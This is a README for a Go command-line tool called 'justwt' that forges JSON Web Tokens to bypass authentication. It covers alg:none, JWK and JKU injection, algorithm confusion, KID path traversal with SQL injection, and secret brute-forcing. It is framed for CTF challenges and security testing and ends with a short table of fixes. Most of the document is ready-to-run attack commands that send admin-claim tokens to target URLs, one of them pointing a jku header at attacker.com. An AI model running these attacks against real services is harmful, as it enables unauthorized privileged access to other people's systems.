# Just Wreck Tokens (justwt)

```
  ___ _   _ _____ _____   _    _______ _____ _____  _   __  _____ _____ _   __ _____ _   _  _____ 
  |_  | | | /  ___|_   _| | |  | | ___ \  ___/  __ \| | / / |_   _|  _  | | / /|  ___| \ | |/  ___|
    | | | | \ '--.  | |   | |  | | |_/ / |__ | /  \/| |/ /    | | | | | | |/ / | |__ |  \| |\ '---. 
    | | | | |'--. \ | |   | |/\| |    /|  __|| |    |    \    | | | | | |    \ |  __|| . ' | '---. \
/\__/ / |_| /\__/ / | |   \  /\  / |\ \| |___| \__/\| |\  \   | | \ \_/ / |\  \| |___| |\  |/\__/ /
\____/ \___/\____/  \_/    \/  \/\_| \_\____/ \____/\_| \_/   \_/  \___/\_| \_/\____/\_| \_/\____/ 
```

> **Comprehensive JWT Attack Tool** — Generate forged tokens exploiting common vulnerabilities (alg:none, JWK injection, JKU injection, algorithm confusion, KID traversal, brute-force). Built for CTF challenges & security testing.

**Author:** buzz | **Version:** v1.0 | **Language:** Go

---

## 🚀 Installation

```bash
cd /path/to/just-wreck-tokens
go build -o justwt .
./justwt -h
```

---

## ⚡ Basic Usage

Every command requires 3 parameters:

```bash
justwt -jwt TOKEN -payload '{"isAdmin": true, "sub": "admin"}' -url https://target/admin -all
```

| Parameter | Description |
|-----------|-------------|
| `-jwt` | The JWT token to attack |
| `-payload` | JSON payload to inject (replaces original) |
| `-url` | Target URL to test |

---

## 🎯 Attacks

### 1️⃣ **PAYLOAD MUTATION** — Change payload, keep signature

For servers that don't validate signatures, just modify the payload.

```bash
justwt -jwt $TOKEN \
  -payload '{"isAdmin": true, "sub": "admin"}' \
  -url https://target/admin \
  -payload-only -v
```

**Flags:**
- `-payload-only` — Enable this attack

---

### 2️⃣ **ALG:NONE BYPASS** — Remove signature requirement

Forces server to skip signature verification by setting `alg` to `none`.

```bash
justwt -jwt $TOKEN \
  -payload '{"isAdmin": true, "sub": "admin"}' \
  -url https://target/admin \
  -none -v
```

**Flags:**
- `-none` — Enable this attack

---

### 3️⃣ **BRUTE FORCE** — Crack HS256 secret

Test a wordlist against the original token signature.

```bash
justwt -jwt $TOKEN \
  -payload '{"isAdmin": true, "sub": "admin"}' \
  -url https://target/admin \
  -brute -wordlist /path/to/wordlist.txt -v
```

**Flags:**
- `-brute` — Enable brute-force
- `-wordlist <path>` — Path to wordlist file

---

### 4️⃣ **JWK INJECTION** — Embed public key in header

Generate a keypair, sign with private key, embed public key in `jwk` header.

```bash
justwt -jwt $TOKEN \
  -payload '{"isAdmin": true, "sub": "admin"}' \
  -url https://target/admin \
  -jwk -v
```

**Flags:**
- `-jwk` — Enable JWK injection
- `-private-key <file>` — Use PEM private key instead of generating one

---

### 5️⃣ **JKU INJECTION** — Host key on external server

Auto-deploy public key to surge.sh, sign token with private key.

```bash
justwt -jwt $TOKEN \
  -payload '{"isAdmin": true, "sub": "admin"}' \
  -url https://target/admin \
  -jku -surge-name mycustom -v
```

**Flags:**
- `-jku` — Enable JKU injection
- `-surge-name <name>` — Custom surge.sh subdomain (e.g., `httpcats` → `httpcats.surge.sh`)
- `-jku-url <url>` — Manual JKU endpoint (skip auto-deploy)
- `-jku-encode` — Base64 encode JKU value (bypass path filters)
- `-private-key <file>` — Use PEM private key

**Example with custom JKU:**
```bash
justwt -jwt $TOKEN \
  -payload '{"isAdmin": true, "sub": "admin"}' \
  -url https://target/admin \
  -jku -jku-url https://attacker.com/public-key.json -v
```

---

### 6️⃣ **KID PATH TRAVERSAL** — Exploit key lookup

Try path traversal payloads (`../dev/null`, `../../dev/null`, etc.) and SQL injection in `kid` field.

```bash
justwt -jwt $TOKEN \
  -payload '{"isAdmin": true, "sub": "admin"}' \
  -url https://target/admin \
  -kid -v
```

**Flags:**
- `-kid` — Enable KID traversal

---

### 7️⃣ **ALGORITHM CONFUSION** — RS256 → HS256

**Auto-detection:** If the original token has a `jku` header, automatically fetch the public key and attempt algorithm confusion.

```bash
# Auto-detect from token's jku header
justwt -jwt $TOKEN \
  -payload '{"isAdmin": true, "sub": "admin"}' \
  -url https://target/admin \
  -alg-confusion -v
```

**Manual mode with public key from file:**
```bash
justwt -jwt $TOKEN \
  -payload '{"isAdmin": true, "sub": "admin"}' \
  -url https://target/admin \
  -alg-confusion -target /path/to/public.pem -v
```

**Flags:**
- `-alg-confusion` — Enable algorithm confusion
- `-target <url|file>` — Public key URL or file path
- `-sig2n-token2 <jwt>` — 2nd JWT for sig2n extraction (requires Docker)

---

## 🔧 Global Options

| Flag | Description |
|------|-------------|
| `-cookie <name>` | Cookie name for token (default: `session`) |
| `-v` | Verbose mode (show all token headers) |
| `-private-key <file>` | PEM private key for RSA signing (JWK/JKU) |

**Example:**
```bash
justwt -jwt $TOKEN \
  -payload '{"admin":true}' \
  -url https://target \
  -all \
  -cookie access_token \
  -v
```

---

## 🚩 Run All Attacks

```bash
justwt -jwt $TOKEN \
  -payload '{"isAdmin": true, "sub": "admin"}' \
  -url https://target/admin \
  -all -v
```

This runs: payload mutation → alg:none → brute-force → JWK → JKU → KID traversal → algorithm confusion

---

## 📊 Output Format

**Success:**
```
✓ #12  JKU (JWKS Set)
    eyJhbGciOiJSUzI1NiIsImp...
    [+] HTTP 200 | Length: 1208 ← SUCCESS
```

**Failed:**
```
✗ #1   Payload (keep sig)
    eyJhbGciOiJSUzI1NiI...
    [~] HTTP 401 | Length: 500
```

**Color Codes:**
- `[+]` Success (Green)
- `[x]` Error (Red)
- `[~]` Info (Yellow)
- `[!]` Warning (Yellow)

---

## 💡 Real-World Examples

### PortSwigger Lab: JWT with JWK

```bash
justwt -jwt eyJraWQiOiI5MTU2ZDk0NS1jNzZlLTQyNzAtOWUzMC02MWRjMzA0MTUwODciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczODM2OTMyNCwic3ViIjoid2llbmVyIn0.xyz... \
  -payload '{"sub":"administrator","iss":"portswigger","exp":1738369324}' \
  -url https://0a1234567890abcd.web-security-academy.net/admin \
  -jwk -v
```

### CTF: JKU Injection with Custom Subdomain

```bash
justwt -jwt $HARDEN_TOKEN \
  -payload '{"isAdmin":true,"sub":"admin"}' \
  -url https://httpcats.hardenctf.fr/admin \
  -jku -surge-name httpcats \
  -cookie access-token -v
```

### Manual Algorithm Confusion

```bash
justwt -jwt $TOKEN \
  -payload '{"admin":true}' \
  -url https://target/admin \
  -alg-confusion -target https://target/jwks.json -v
```

---

## 📝 Requirements

- **Go 1.21+** — To build the tool
- **surge.sh CLI** (optional) — For JKU auto-deployment
- **Docker** (optional) — For sig2n extraction

Install surge:
```bash
npm install -g surge
```

---

## 🔗 JWT Vulnerabilities Explained

| Attack | Vulnerability | Fix |
|--------|-------------|-----|
| Payload Mutation | No signature validation | Always validate signatures |
| Alg:None | Accepts `alg: null` | Whitelist allowed algorithms |
| Brute-Force | Weak secret | Use strong random secrets (256+ bits) |
| JWK Injection | Header JWK trusted blindly | Validate JWK against known keys only |
| JKU Injection | Fetches key from untrusted URL | Whitelist allowed JKU domains |
| KID Traversal | Unsanitized `kid` parameter | Validate KID format strictly |
| Alg Confusion | RSA key used as HMAC secret | Check algorithm consistency |

---

## 📄 License

MIT

---

**Made with 🔥 by buzz**
